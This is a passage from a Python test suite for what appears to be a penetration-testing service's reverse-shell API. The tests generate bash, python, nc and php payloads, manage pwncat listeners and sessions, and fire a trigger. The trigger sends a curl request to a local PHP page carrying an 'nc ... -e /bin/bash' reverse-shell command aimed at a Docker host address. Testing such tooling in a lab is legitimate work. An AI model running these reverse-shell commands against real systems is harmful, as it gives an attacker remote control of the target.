            exec_result = exec_response.json()
            self.assertTrue(exec_result.get("success", False))
            
            # Verify execution results
            output = exec_result.get("output", "")
            self.assertIn("Custom Payload Execution Test", output)
            self.assertIn("Payload executed successfully", output)
            print(f"✅ Payload executed successfully")
            
        finally:
            # Clean up session
            self.cleanup_reverse_shell_session(session_id)

    def test_07_generate_reverse_shell_payloads(self):
        """Test generating different types of reverse shell payloads"""
        print("\n🎯 Test: Generate reverse shell payloads")
        
        payload_types = ["bash", "python", "nc", "php"]
        
        for payload_type in payload_types:
            print(f"🔍 Testing {payload_type} payload generation")
            
            payload_data = {
                "local_ip": "172.17.0.1",
                "local_port": 4447,
                "payload_type": payload_type,
                "encoding": "base64"
            }
            
            response = requests.post(
                f"{self.base_url}/api/reverse-shell/generate-payload",
                json=payload_data,
                timeout=TIMEOUTS["quick"]
            )
            
            self.assertEqual(response.status_code, 200)
            result = response.json()
            self.assertTrue(result.get("success", False))
            self.assertIn("payloads", result)
            
            payloads = result.get("payloads", {})
            self.assertIn(payload_type, payloads)
            
            if result.get("encoding") == "base64":
                self.assertIn(f"{payload_type}_base64", payloads)
            
            print(f"✅ {payload_type} payload generated successfully")
        
        print("✅ All payload types generated successfully")

    def test_08_list_active_sessions(self):
        """Test listing all active reverse shell sessions"""
        print("\n🎯 Test: Listing all active sessions")
        
        # Get current sessions
        response = requests.get(f"{self.base_url}/api/reverse-shell/sessions", 
                              timeout=TIMEOUTS["quick"])
        
        self.assertEqual(response.status_code, 200)
        sessions = response.json()  # API returns sessions directly, not wrapped in "sessions" key
        
        print(f"✅ Found {len(sessions)} active sessions")
        
        for session_id, session_info in sessions.items():
            print(f"   📋 Session {session_id}: {session_info}")

    def test_09_session_cleanup_and_stop(self):
        """Test session cleanup and stop functionality"""
        print("\n🎯 Test: Session cleanup and stop functionality")
        
        # Create a temporary session for this test
        session_id = f"{self.session_prefix}_cleanup_test"
        
        listener_data = {
            "session_id": session_id,
            "port": 4460,
            "listener_type": "pwncat"
        }
        
        # Start a listener
        response = requests.post(f"{self.base_url}/api/reverse-shell/listener/start", 
                               json=listener_data, timeout=TIMEOUTS["medium"])
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        self.assertTrue(result.get("success", False))
        
        print(f"✅ Test session created: {session_id}")
        
        # Stop the session
        stop_response = requests.post(f"{self.base_url}/api/reverse-shell/{session_id}/stop", 
                                    timeout=TIMEOUTS["medium"])
        
        self.assertEqual(stop_response.status_code, 200)
        stop_result = stop_response.json()
        self.assertTrue(stop_result.get("success", False))
        
        print(f"✅ Test session stopped successfully: {session_id}")

    def test_10_trigger_action_non_blocking(self):
        """Test the new trigger_action functionality for non-blocking reverse shell trigger"""
        print("\n🎯 Test: Trigger action non-blocking reverse shell functionality")
        
        # Ensure clean environment before test
        self.ensure_clean_environment()
        
        # Step 1: Create a listener session (WITHOUT establishing connection yet)
        session_id = f"{self.session_prefix}_trigger_test"
        port = REVERSE_SHELL_CONFIG["alternative_port"]  # Use alternative port (4501)
        
        listener_data = {
            "session_id": session_id,
            "port": port,
            "listener_type": "pwncat"
        }
        
        try:
            # Start the listener
            print(f"🎧 Starting listener on port {port} for trigger test")
            listener_response = requests.post(
                f"{self.base_url}/api/reverse-shell/listener/start", 
                json=listener_data, 
                timeout=TIMEOUTS["medium"]
            )
            
            self.assertEqual(listener_response.status_code, 200)
            listener_result = listener_response.json()
            self.assertTrue(listener_result.get("success", False))
            
            print(f"✅ Listener started: {session_id}")
            self.active_sessions.append(session_id)
            
            # Step 2: Test the NON-BLOCKING trigger (this is the key test!)
            # This command would normally block the server, but with trigger_action it should return immediately
            trigger_command = f'curl -X POST http://localhost:8080/test_reverse_shell.php -H "Content-Type: application/json" -d "{{\\"command\\": \\"nc 172.17.0.1 {port} -e /bin/bash\\"}}"'
            
            print(f"🚀 Testing NON-BLOCKING trigger action with reverse shell command")
            print(f"   Command: {trigger_command[:80]}...")
            
            # Measure time to ensure it's truly non-blocking
            import time
            start_time = time.time()
            
            # Call the new trigger_action endpoint
            trigger_data = {
                "trigger_command": trigger_command,
                "timeout": 15
            }
            
            response = requests.post(
                f"{self.base_url}/api/reverse-shell/{session_id}/trigger",
                json=trigger_data,
                timeout=TIMEOUTS["medium"]
            )
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # Verify the response
            self.assertEqual(response.status_code, 200)
            result = response.json()
            
            # The trigger should return immediately with success
            self.assertTrue(result.get("success", False))
            self.assertEqual(result.get("session_id"), session_id)
            self.assertIn("background", result.get("message", "").lower())
            
            # Critical test: Response should be nearly immediate (< 3 seconds)
            # Note: We allow up to 3 seconds to account for network latency and Docker overhead
            self.assertLess(response_time, 3.0, 
                           f"Trigger action took {response_time:.2f}s - should be non-blocking!")
            
            print(f"✅ Trigger action returned immediately in {response_time:.2f}s (non-blocking)")
            print(f"   Response: {result}")
            
            # Additional verification: The response time should be significantly faster than
            # what a blocking curl command would take (which would be 5+ seconds)
            if response_time < 2.5:
                print("✅ Response time is excellent (< 2.5s)")
            elif response_time < 3.0:
                print("✅ Response time is acceptable (< 3.0s) - trigger is non-blocking")
            else:
                print("⚠️  Response time is higher than expected but still non-blocking")
            
            # Step 3: Wait for potential connection and verify listener is still responsive
            print("⏳ Waiting for potential reverse shell connection...")
            time.sleep(6)  # Give time for trigger to potentially establish connection
            
            # Check if connection was established via the trigger
            status_response = requests.get(
                f"{self.base_url}/api/reverse-shell/{session_id}/status", 
                timeout=TIMEOUTS["quick"]
            )
            
            if status_response.status_code == 200:
                status_result = status_response.json()
                print(f"📊 Post-trigger status: {status_result}")
                
                if status_result.get("is_connected", False):
                    print("✅ Trigger successfully established reverse shell connection!")
                    
                    # Test that we can execute commands through the triggered connection
                    test_response = requests.post(
                        f"{self.base_url}/api/reverse-shell/{session_id}/command",
                        json={"command": "echo 'triggered_connection_works'", "timeout": 10},
                        timeout=TIMEOUTS["medium"]
                    )
                    
                    if test_response.status_code == 200:
                        test_result = test_response.json()
                        if test_result.get("success", False):
                            print("✅ Commands work through triggered connection")
                        else:
                            print("⚠️  Commands failed through triggered connection")
                    
                else:
                    print("ℹ️  No connection established (trigger might have failed, but that's OK for this test)")
                    print("   The important part is that the trigger was non-blocking")
            
            # Step 4: Verify session management is still working
            print("🧪 Verifying session management still works after trigger...")
            sessions_response = requests.get(f"{self.base_url}/api/reverse-shell/sessions", 
                                          timeout=TIMEOUTS["quick"])
            self.assertEqual(sessions_response.status_code, 200)
            sessions = sessions_response.json()
            self.assertIn(session_id, sessions)
            
            print(f"✅ Session management remains functional after trigger action")
            
        finally:
            # Clean up session
            self.cleanup_reverse_shell_session(session_id)


if __name__ == "__main__":
    unittest.main(verbosity=2)
